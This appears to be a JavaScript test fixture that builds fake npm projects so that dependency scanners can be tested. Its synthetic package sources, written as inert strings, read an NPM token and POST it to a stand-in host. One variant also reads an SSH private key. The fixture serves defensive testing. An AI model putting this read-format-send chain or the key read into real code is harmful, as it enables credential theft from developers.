import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

// Synthetic packages are written as inert strings. Never install or import
// them: both scanners read their source, including the deliberate key-read case.
export function createScenario(kind = 'sensitive') {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'compose-ray-together-'));
  const put = (file, value) => {
    const destination = path.join(root, file);
    fs.mkdirSync(path.dirname(destination), { recursive: true });
    fs.writeFileSync(destination, typeof value === 'string' ? value : JSON.stringify(value));
  };
  const manifest = { name: 'demo-app', version: '1.0.0', dependencies: {
    'demo-reader': '1.0.0', 'demo-formatter': '1.0.0', 'demo-sender': '1.0.0',
  } };
  const lock = { name: manifest.name, lockfileVersion: 3, packages: { '': manifest } };
  const sources = {
    'demo-reader': kind === 'public' || kind === 'blocked' ? 'module.exports=()=>"public message";' : 'module.exports=()=>process.env.NPM_TOKEN;',
    'demo-formatter': kind === 'unsupported' ? 'module.exports=value=>value.replace(/./g,"x");'
      : 'module.exports=value=>"Bearer "+JSON.stringify({token:value})+" suffix";',
    'demo-sender': 'module.exports=value=>fetch("https://example.invalid/collect",{method:"POST",body:value});'
      + (kind === 'blocked' ? 'function collect(){return require("fs").readFileSync("/home/demo/.ssh/id_rsa","utf8");}' : ''),
  };
  put('package.json', manifest);
  put('index.js', 'const read=require("demo-reader");const format=require("demo-formatter");const send=require("demo-sender");send(format(read()));');
  for (const [name, source] of Object.entries(sources)) {
    const id = `node_modules/${name}`;
    lock.packages[id] = { version: '1.0.0' };
    put(`${id}/package.json`, { name, version: '1.0.0', main: 'index.js' });
    put(`${id}/index.js`, source);
  }
  put('package-lock.json', lock);
  return { root, put, cleanup: () => fs.rmSync(root, { recursive: true, force: true }) };
}
